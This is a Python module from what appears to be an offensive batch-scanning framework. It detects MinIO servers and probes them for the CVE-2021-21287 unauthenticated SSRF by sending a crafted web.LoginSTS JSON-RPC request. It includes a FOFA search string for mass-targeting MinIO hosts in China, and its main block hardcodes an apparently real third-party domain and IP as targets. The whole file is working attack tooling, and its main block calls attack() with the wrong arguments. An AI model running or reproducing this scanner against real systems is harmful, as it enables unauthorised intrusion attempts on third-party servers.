# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 14:08

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *


# fofa: "minio" && country="CN"
# python batch.py -m exploit.web.Minio.unauth_ssrf -cs -fs "\"minio\" && country=\"CN\""

class Script(BaseScript):
    name = 'Minio'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.SSRF
        # 编号
        self.bugNumber = 'CVE-2021-21287'
        # 来源
        self.refer = 'https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html'
        # 特定路径判断
        self.detectPathList = ['/minio/login']
        # exec
        self.execPathList = ['/minio/webrpc']
        # session
        self.session = session
        # 相关信息
        self.info = ''

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False, allow_redirects=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if '<title>Minio Browser</title>' in text or '<title>MinIO Browser</title>' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('Minio Finger', url))
                            return {'name': 'Minio Finger', 'url': url, 'software': 'Minio'}
        except Exception:
            return None

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/json'})
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                data = '{"id":1,"jsonrpc":"2.0","params":{"token": "Test"},"method":"web.LoginSTS"}'
                async with self.session.post(url=url, headers=headers, data=data, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'We encountered an internal error' in text:
                            tqdm.write(Fore.RED + '[{}] {}'.format('Minio Unauth SSRF', url))
                            return {'name': 'Minio Unauth SSRF', 'url': url, 'software': 'Minio'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    #
    # resp = requests.get('http://60.205.227.65/favicon-32x32.png', verify=False, allow_redirects=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    semaphore = asyncio.Semaphore(500)
    sc = Script('zhsj.nbcc.cn', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
